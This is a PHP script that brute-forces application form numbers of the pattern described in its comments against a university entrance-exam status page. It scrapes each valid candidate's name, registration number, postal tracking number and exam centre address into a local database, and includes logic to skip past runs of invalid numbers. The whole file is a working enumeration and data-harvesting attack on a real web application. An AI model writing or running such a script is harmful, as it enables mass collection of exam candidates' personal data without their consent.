<?php
require 'HTTP/Request2.php';
require '../functions.php';
/**
 * A little analysis reveals the second digit to be the "zone"
 * in the application form numbers
 * The first four numbers are the most significant
 * However, nothing is getting accepted with over 3
 * in any of the places
 * Brute forcing to see what is possible
 *
 * Update: Its not the second digit, but the first two digits combined.
 * This script bruteforces the regnostatus.php
 * to check the validity of the registration numbers
 *
 * REG_NO = C[11-17|21-27][1-3][0-9]{5}
 */
$invalid_count = 0;
$i=isset($argv[1])? $argv[1] : 11;
$j = $argv[2];
if(isset($argv[3]))
	$k = $argv[3]*100;
else
	$k=1;
	
$current = R::getAll("SELECT SUBSTRING(form_no,2) as form_no FROM candidate WHERE form_no LIKE 'C$i$j%'");
//we will make searches against this data instead of hitting the database
foreach($current as $index=>$data)
	$current[$index] = $data['form_no'];
//print_r(array_slice($current,0,10));


for(;$k<100000;$k++){
	/**
	 * The variables are still i,j,k as i haveC11101059
	 * no idea what they stand for
	 */
	$k=str_pad($k,5,0,STR_PAD_LEFT);
	
	
	//first search it in database
	//$results = R::find('candidate',' form_no = ?', array( $application_form_no ));
	
		
	//keep on increasing k till the value isn't present in array
	while(true){
		$k=str_pad($k,5,0,STR_PAD_LEFT);
		$n = (int)"$i$j$k";
		
		if(array_search($n,$current) === false)
			break;
		else{
			echo "C$i$j$k - PRESENT\n";
			$k++;
		}
	}
	$application_form_no =  "C".$i.$j.$k;
	//Make the request to the server
	$request = new HTTP_Request2('http://jee.iitr.ernet.in/regnostatus.php');
	$request->setMethod(HTTP_Request2::METHOD_POST)
			->addPostParameter('appno', $application_form_no);
	$body = $request->send()->getBody();
	$data = cut_str($body,"<center>","</center>");
	
	
	if(strpos($data,"invalid") !==false){
		echo $application_form_no ." - INVALID\n";
		$invalid_count++;
		//if the registration number was invalid
	}
	elseif(strpos($data,"has not been received") !== false){
		echo $application_form_no. " - NOT RECIEVED\n";
		$invalid_count++;
	}
	elseif(strpos($data,"cancelled") !== false){
		echo $application_form_no. " - CANCELLED\n";
		//$invalid_count++;
		$invalid_count = 0;
	}
	else{
		$candidate = R::dispense('candidate');
		$candidate->name = cut_str($data,"Name              : ","<br>");
		
		//for debugging non-recieved forms
		if(!$candidate->name)
			{echo $body;exit;}
		
		$candidate->reg_no = cut_str($data,"Number is :  ","<br>");
		$candidate->tracking = cut_str($data,"articlenumber=",">");
		if(strlen($candidate->tracking)!=13) $candidate->tracking='';
		$candidate->form_no = $application_form_no;
		$candidate->center_address = trim(str_replace("<br>","\n",cut_str($data,"Centre is :<br>","<font")));
		R::store($candidate);
		echo $application_form_no. " - SAVED\n";
		$invalid_count = 0;
	}
	if($invalid_count == 10){
		echo "Skipping...\n";
		$invalid_count = 0;
		$k+=100;
		$k = $k-$k%100;//round to nearest 100
	}
}
